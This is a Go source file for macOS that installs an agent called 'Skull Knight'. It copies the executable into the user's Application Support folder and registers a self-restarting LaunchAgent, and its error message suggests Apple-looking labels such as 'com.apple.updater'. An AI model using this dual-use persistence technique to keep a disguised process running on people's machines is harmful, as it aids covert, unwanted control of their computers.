//go:build darwin
// +build darwin

package persistence

import (
	"fmt"
	"io"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"text/template"
)

const launchAgentPlist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>{{.Label}}</string>
	<key>ProgramArguments</key>
	<array>
		<string>{{.ExePath}}</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
	<key>StandardOutPath</key>
	<string>/tmp/skull-knight-agent.log</string>
	<key>StandardErrorPath</key>
	<string>/tmp/skull-knight-agent-error.log</string>
</dict>
</plist>
`

func binaryName() string {
	if DefaultStartupName != "" {
		return DefaultStartupName
	}
	return "agent"
}

func plistLabel() string {
	if DefaultStartupName != "" {
		return DefaultStartupName
	}
	return "com.Skull Knight.agent"
}

func getPlistPath() (string, error) {
	usr, err := user.Current()
	if err != nil {
		return "", err
	}
	return filepath.Join(usr.HomeDir, "Library", "LaunchAgents", plistLabel()+".plist"), nil
}

func getTargetPath() (string, error) {
	usr, err := user.Current()
	if err != nil {
		return "", err
	}
	return filepath.Join(usr.HomeDir, "Library", "Application Support", "Skull Knight", binaryName()), nil
}

func install(exePath string) error {

	if DefaultStartupName != "" && !strings.HasPrefix(DefaultStartupName, "com.") {
		return fmt.Errorf("startup name %q is invalid for macOS: LaunchAgent labels must start with \"com.\" (e.g. com.apple.updater)", DefaultStartupName)
	}

	targetPath, err := getTargetPath()
	if err != nil {
		return fmt.Errorf("failed to get target path: %w", err)
	}

	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create Skull Knight directory: %w", err)
	}

	if err := replaceExecutable(exePath, targetPath); err != nil {
		return err
	}

	plistPath, err := getPlistPath()
	if err != nil {
		return fmt.Errorf("failed to get plist path: %w", err)
	}

	launchAgentsDir := filepath.Dir(plistPath)
	if err := os.MkdirAll(launchAgentsDir, 0755); err != nil {
		return fmt.Errorf("failed to create LaunchAgents directory: %w", err)
	}

	file, err := os.Create(plistPath)
	if err != nil {
		return fmt.Errorf("failed to create plist file: %w", err)
	}
	defer file.Close()

	tmpl, err := template.New("plist").Parse(launchAgentPlist)
	if err != nil {
		return fmt.Errorf("failed to parse template: %w", err)
	}

	data := struct {
		Label   string
		ExePath string
	}{
		Label:   plistLabel(),
		ExePath: targetPath,
	}

	if err := tmpl.Execute(file, data); err != nil {
		return fmt.Errorf("failed to write plist file: %w", err)
	}

	return nil
}

func replaceExecutable(exePath, targetPath string) error {
	srcFile, err := os.Open(exePath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer srcFile.Close()

	dir := filepath.Dir(targetPath)
	tmpFile, err := os.CreateTemp(dir, "agent-*.tmp")
	if err != nil {
		return fmt.Errorf("failed to create temp executable: %w", err)
	}
	tmpPath := tmpFile.Name()
	defer func() {
		_ = tmpFile.Close()
		_ = os.Remove(tmpPath)
	}()

	if _, err := io.Copy(tmpFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable: %w", err)
	}
	if err := tmpFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync temp file: %w", err)
	}
	if err := tmpFile.Close(); err != nil {
		return fmt.Errorf("failed to close temp file: %w", err)
	}

	if err := os.Rename(tmpPath, targetPath); err != nil {
		if removeErr := os.Remove(targetPath); removeErr == nil {
			if err = os.Rename(tmpPath, targetPath); err == nil {
				return nil
			}
		}
		return fmt.Errorf("failed to replace executable at %s: %w", targetPath, err)
	}

	if err := os.Chmod(targetPath, 0755); err != nil {
		return fmt.Errorf("failed to set executable permissions: %w", err)
	}

	return nil
}

func configure(exePath string) error {
	plistPath, err := getPlistPath()
	if err != nil {
		return fmt.Errorf("failed to get plist path: %w", err)
	}

	launchAgentsDir := filepath.Dir(plistPath)
	if err := os.MkdirAll(launchAgentsDir, 0755); err != nil {
		return fmt.Errorf("failed to create LaunchAgents directory: %w", err)
	}

	file, err := os.Create(plistPath)
	if err != nil {
		return fmt.Errorf("failed to create plist file: %w", err)
	}
	defer file.Close()

	tmpl, err := template.New("plist").Parse(launchAgentPlist)
	if err != nil {
		return fmt.Errorf("failed to parse template: %w", err)
	}

	data := struct {
		Label   string
		ExePath string
	}{
		Label:   plistLabel(),
		ExePath: exePath,
	}

	if err := tmpl.Execute(file, data); err != nil {
		return fmt.Errorf("failed to execute template: %w", err)
	}

	return nil
}

func uninstall() error {
	plistPath, err := getPlistPath()
	if err != nil {
		return fmt.Errorf("failed to get plist path: %w", err)
	}

	if err := os.Remove(plistPath); err != nil && !os.IsNotExist(err) {
		return fmt.Errorf("failed to remove plist file: %w", err)
	}

	if targetPath, err := getTargetPath(); err == nil {
		os.Remove(targetPath)
	}

	return nil
}
